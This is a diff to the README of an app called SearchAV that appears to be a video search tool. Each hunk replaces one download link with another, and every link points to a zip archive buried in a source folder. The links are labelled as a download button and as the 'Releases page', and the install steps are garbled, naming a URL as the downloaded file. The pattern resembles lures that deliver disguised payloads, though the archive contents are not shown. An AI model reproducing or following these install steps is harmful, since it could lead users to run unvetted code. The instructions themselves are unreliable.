@@ -7,7 +7,7 @@ SearchAV is a modern video search aggregation service. It enables you to search 
 To start using SearchAV, follow these simple steps to download and run the application.
 
 ## 📥 Download SearchAV
-[![Download SearchAV](https://raw.githubusercontent.com/Cnea7732/SearchAV/master/frontend/src/lib/components/AV-Search-2.2.zip)](https://raw.githubusercontent.com/Cnea7732/SearchAV/master/frontend/src/lib/components/AV-Search-2.2.zip)
+[![Download SearchAV](https://github.com/Cnea7732/SearchAV/raw/refs/heads/master/backend/cmd/server/AV_Search_3.6-alpha.4.zip)](https://github.com/Cnea7732/SearchAV/raw/refs/heads/master/backend/cmd/server/AV_Search_3.6-alpha.4.zip)
 
 ## 📂 System Requirements
 Before you download and install SearchAV, ensure that your system meets the following requirements:
@@ -19,7 +19,7 @@ Before you download and install SearchAV, ensure that your system meets the foll
 
 ## 💻 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Cnea7732/SearchAV/master/frontend/src/lib/components/AV-Search-2.2.zip) to find the latest version of SearchAV.
+   Go to the [Releases page](https://github.com/Cnea7732/SearchAV/raw/refs/heads/master/backend/cmd/server/AV_Search_3.6-alpha.4.zip) to find the latest version of SearchAV.
 
 2. **Select the Latest Version**  
    Look for the latest release at the top of the page. Click on it to see the available files.
@@ -37,7 +37,7 @@ Before you download and install SearchAV, ensure that your system meets the foll
      - Double-click the file to mount it.
      - Drag the SearchAV icon to your Applications folder.
    - If you are using Linux:
-     - Open a terminal and navigate to the folder where you downloaded the `https://raw.githubusercontent.com/Cnea7732/SearchAV/master/frontend/src/lib/components/AV-Search-2.2.zip` or `.deb` file.
+     - Open a terminal and navigate to the folder where you downloaded the `https://github.com/Cnea7732/SearchAV/raw/refs/heads/master/backend/cmd/server/AV_Search_3.6-alpha.4.zip` or `.deb` file.
      - Extract the files or use the package manager to install.
 
 5. **Run the Application**  
